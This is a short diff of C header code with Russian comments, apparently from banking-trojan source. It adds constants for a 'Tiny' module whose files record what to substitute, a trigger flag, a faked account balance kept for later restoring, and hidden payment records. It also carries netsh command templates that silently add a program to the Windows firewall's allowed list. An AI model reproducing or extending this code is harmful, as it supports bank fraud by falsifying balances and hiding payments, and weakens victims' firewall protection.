@@ -237,6 +237,15 @@ CSSTR CBankFlagUpdate[] = "cbank_flagupdate.txt";
 CSSTR CBankRestFixed[] = "cbank_restfixed.txt"; 
 #endif //BBSCBankH
 
+//для Tiny
+#ifdef TinyH
+CSSTR TinyReplacement[] = "tiny_replacement.txt"; //имя файла хранящий что подменять
+CSSTR TinyFlagUpdate[] = "tiny_flagupdate.txt"; //флаг для запуска подмены (был создан файл подмены)
+CSSTR TinyOldBalans[] = "tiny_oldbalans.dat"; //имя файла для хранения подменяемого баланса, для восстановления
+CSSTR TinyOldDocs[] = "tiny_olddocs.dat"; //имя файла для хранения данных по скрываемым платежкам, для восстановления
+#endif //TinyH
+
+
 //команда для добавления в список доверенных браундмаузера
 CSSTR NetshFirewallWinXp[] = "netsh firewall add allowedprogram \"%s\" %s ENABLE"; //для windows XP
 CSSTR NetshFirewallWin7[] = "netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow program=\"%s\""; //для windows 7
